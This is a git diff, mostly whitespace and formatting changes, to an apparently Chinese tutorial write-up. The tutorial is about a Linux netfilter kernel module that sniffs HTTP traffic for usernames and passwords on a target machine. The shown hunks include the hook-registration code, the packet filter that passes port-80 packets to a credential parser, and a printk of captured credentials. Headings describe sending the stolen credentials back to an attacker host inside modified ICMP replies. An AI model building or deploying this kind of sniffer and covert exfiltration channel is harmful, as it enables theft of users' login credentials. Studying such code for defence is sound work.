@@ -31,34 +31,34 @@ ubuntu 18.04 kernel 4.15
      ```
   
 
-*   PRE_ROUTING 钩子：watch_in() 检查发出去的包
-*   POST_ROUTING钩子：watch_out() 检查收到的包   
+* PRE_ROUTING 钩子：watch_in() 检查发出去的包
+* POST_ROUTING钩子：watch_out() 检查收到的包   
 
-  ```c  
+ ```c  
     static unsigned int watch_out(void *priv, struct sk_buff *skb,
                                             const struct nf_hook_state *state)
     {
-    struct sk_buff *sb = skb;
-    struct tcphdr *tcp;
-    printk("post routing");
-    /* Make sure this is a TCP packet first */
-    if (ip_hdr(sb)->protocol != IPPROTO_TCP)
-    return NF_ACCEPT; /* Nope, not TCP */
-    tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));
-    /* Now check to see if it's an HTTP packet */
-    if (tcp->dest != htons(80))
-    return NF_ACCEPT; /* Nope, not FTP */
-    //Parse the HTTP packet for relevant information if we don't already have a username and password pair. 
-    if (!have_pair)
-    {
-    printk("check http");
-    check_http(sb);
-    }
-    
-    return NF_ACCEPT;
+        struct sk_buff *sb = skb;
+        struct tcphdr *tcp;
+        printk("post routing");
+        /* Make sure this is a TCP packet first */
+        if (ip_hdr(sb)->protocol != IPPROTO_TCP)
+            return NF_ACCEPT; /* Nope, not TCP */
+        tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));
+        /* Now check to see if it's an HTTP packet */
+        if (tcp->dest != htons(80))
+            return NF_ACCEPT; /* Nope, not FTP */
+        //Parse the HTTP packet for relevant information if we don't already have a username and password pair. 
+        if (!have_pair)
+        {
+            printk("check http");
+            check_http(sb);
+        }
+
+        return NF_ACCEPT;
     }
 
-  ```
+ ```
   
  ```c    
     struct nf_hook_ops pre_hook;  
@@ -66,48 +66,48 @@ ubuntu 18.04 kernel 4.15
     
     int init_module()
     {
-    pre_hook.hook = watch_in;
-    pre_hook.pf = PF_INET;
-    pre_hook.priority = NF_IP_PRI_FIRST;
-    pre_hook.hooknum = NF_INET_PRE_ROUTING;
-    
-    post_hook.hook = watch_out;
-    post_hook.pf = PF_INET;
-    post_hook.priority = NF_IP_PRI_FIRST;
-    post_hook.hooknum = NF_INET_POST_ROUTING;
-    
-    nf_register_net_hook(&init_net,&pre_hook);
-    nf_register_net_hook(&init_net,&post_hook);
-    return 0;
+        pre_hook.hook = watch_in;
+        pre_hook.pf = PF_INET;
+        pre_hook.priority = NF_IP_PRI_FIRST;
+        pre_hook.hooknum = NF_INET_PRE_ROUTING;
+
+        post_hook.hook = watch_out;
+        post_hook.pf = PF_INET;
+        post_hook.priority = NF_IP_PRI_FIRST;
+        post_hook.hooknum = NF_INET_POST_ROUTING;
+
+        nf_register_net_hook(&init_net,&pre_hook);
+        nf_register_net_hook(&init_net,&post_hook);
+        return 0;
 
  ```
   
  #### 3. 在target内核用netfilter过滤发出去http包，发现port=80的http包，就调用check_http（）
  
-  ```c
+ ```c
 
     static unsigned int watch_out(void *priv, struct sk_buff *skb,
     const struct nf_hook_state *state)
     {
-    struct sk_buff *sb = skb;
-    struct tcphdr *tcp;
-    printk("post routing");
-    /* Make sure this is a TCP packet first */
-    if (ip_hdr(sb)->protocol != IPPROTO_TCP)
-    return NF_ACCEPT; /* Nope, not TCP */
-    tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));
-    /* Now check to see if it's an HTTP packet */
-    if (tcp->dest != htons(80))
-    return NF_ACCEPT; /* Nope, not FTP */
-    /* Parse the HTTP packet for relevant information if we don't already
-    * have a username and password pair. */
-    if (!have_pair)
-    {
-    printk("check http");
-    check_http(sb);
-    }
-    /* We are finished with the packet, let it go on its way */
-    return NF_ACCEPT;
+        struct sk_buff *sb = skb;
+        struct tcphdr *tcp;
+        printk("post routing");
+        /* Make sure this is a TCP packet first */
+        if (ip_hdr(sb)->protocol != IPPROTO_TCP)
+            return NF_ACCEPT; /* Nope, not TCP */
+        tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));
+        /* Now check to see if it's an HTTP packet */
+        if (tcp->dest != htons(80))
+            return NF_ACCEPT; /* Nope, not FTP */
+        /* Parse the HTTP packet for relevant information if we don't already
+        * have a username and password pair. */
+        if (!have_pair)
+        {
+            printk("check http");
+            check_http(sb);
+        }
+        /* We are finished with the packet, let it go on its way */
+        return NF_ACCEPT;
     }
 ```
 
@@ -171,11 +171,11 @@ ubuntu 18.04 kernel 4.15
     printk("Have a uid&pwd pair! U: %s P: %s\n", username, password);
     }
 
-    ```
+ ```
  
  #### 4. target中使用netfilter过滤收到的包，当发现特定的icmp包后，直接修改此数据报，mac、ip、username、pwd，并发送回hack。  
  
-  ```c
+ ```c
 
     static unsigned int watch_in(void *priv, struct sk_buff *skb,
     const struct nf_hook_state *state)
@@ -277,7 +277,7 @@ ubuntu 18.04 kernel 4.15
     return;
     }
     
-```
+ ```
  
  ### hack端的操作 
  
@@ -323,7 +323,7 @@ ubuntu 18.04 kernel 4.15
 
 
 ### 参考
-[https://blog.csdn.net/bw_yyziq/article/details/78290715](https://blog.csdn.net/bw_yyziq/article/details/78290715)
+[https://blog.csdn.net/bw_yyziq/article/details/78290715](https://blog.csdn.net/bw_yyziq/article/details/78290715)  
 [https://zhuanlan.zhihu.com/p/61164326  ](https://zhuanlan.zhihu.com/p/61164326  )
 
 
